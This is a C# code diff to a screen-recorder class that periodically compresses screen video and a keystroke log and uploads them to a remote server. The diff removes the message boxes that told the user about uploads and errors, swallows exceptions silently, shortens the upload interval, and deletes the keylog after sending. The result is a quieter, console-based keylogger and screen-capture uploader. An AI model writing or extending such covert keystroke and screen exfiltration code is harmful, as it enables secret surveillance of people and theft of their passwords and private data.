@@ -1,7 +1,7 @@
 using System;
 using System.Timers;
-using System.Windows.Forms;
 using System.IO;
+using System.Threading.Tasks;
 
 namespace ScreenRecorder
 {
@@ -12,10 +12,9 @@ namespace ScreenRecorder
     {
         private System.Timers.Timer? timer;
         private DateTime lastAutoUploadTime;
-        private int autoUploadIntervalMinutes = 10; // 自动上传间隔（分钟）
+        private int autoUploadIntervalMinutes = 2; // 自动上传间隔（分钟）- 为测试缩短为1分钟
         private FileCompressor fileCompressor;
         private FileUploader fileUploader;
-        private Form mainForm;
 
         public event EventHandler? AutoUploadRequired;
 
@@ -25,9 +24,8 @@ namespace ScreenRecorder
             set { autoUploadIntervalMinutes = value; }
         }
 
-        public AutoUploadTimer(Form form, FileCompressor compressor, FileUploader uploader)
+        public AutoUploadTimer(FileCompressor compressor, FileUploader uploader)
         {
-            mainForm = form;
             fileCompressor = compressor;
             fileUploader = uploader;
         }
@@ -63,10 +61,8 @@ namespace ScreenRecorder
         /// </summary>
         private void Timer_Elapsed(object? sender, ElapsedEventArgs e)
         {
-            mainForm.Invoke((MethodInvoker)delegate
-            {
-                CheckAutoUpload();
-            });
+            // 直接检查是否需要自动上传，不再需要UI线程
+            CheckAutoUpload();
         }
 
         /// <summary>
@@ -88,27 +84,42 @@ namespace ScreenRecorder
         /// </summary>
         /// <param name="videoOutputPath">视频文件路径</param>
         /// <param name="keylogPath">键盘记录文件路径</param>
-        public void PerformAutoUpload(string videoOutputPath, string keylogPath)
+        public async Task PerformAutoUploadAsync(string videoOutputPath, string keylogPath)
         {
             if (string.IsNullOrEmpty(videoOutputPath) || string.IsNullOrEmpty(keylogPath))
                 return;
 
             try
             {
-                // 压缩并上传当前的视频文件
-                string autoUploadZipFilePath = fileCompressor.CompressFilesForAutoUpload(videoOutputPath, keylogPath);
-                if (!string.IsNullOrEmpty(autoUploadZipFilePath))
+                // 确保所有操作都在后台线程中完成
+                await Task.Run(async () =>
                 {
-                    // 因为是在UI线程中，所以需要使用Wait来确保上传完成
-                    fileUploader.UploadToRemoteServerAsync(autoUploadZipFilePath).Wait();
-                }
+                    try
+                    {
+                        // 等待一段时间确保文件句柄被释放
+                        await Task.Delay(100);
 
-                // 通知用户自动上传已完成
-                MessageBox.Show("自动上传完成，继续录制中...", "自动上传", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                        // 直接调用异步版本的压缩方法
+                        string autoUploadZipFilePath = await fileCompressor.CompressFilesForAutoUploadAsync(videoOutputPath, keylogPath);
+
+                        if (!string.IsNullOrEmpty(autoUploadZipFilePath))
+                        {
+                            // 等待一段时间确保压缩文件句柄被释放
+                            await Task.Delay(100);
+
+                            // 执行上传操作，并传递键盘记录文件路径以便在上传完成后删除
+                            await fileUploader.UploadToRemoteServerAsync(autoUploadZipFilePath, keylogPath);
+                        }
+                    }
+                    catch (Exception)
+                    {
+                        // 内部异常已经被处理，避免再次抛出
+                    }
+                });
             }
-            catch (Exception ex)
+            catch (Exception)
             {
-                MessageBox.Show($"自动上传过程中出错: {ex.Message}", "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                // 在控制台模式下，错误会通过ConsoleApp处理
             }
         }
     }
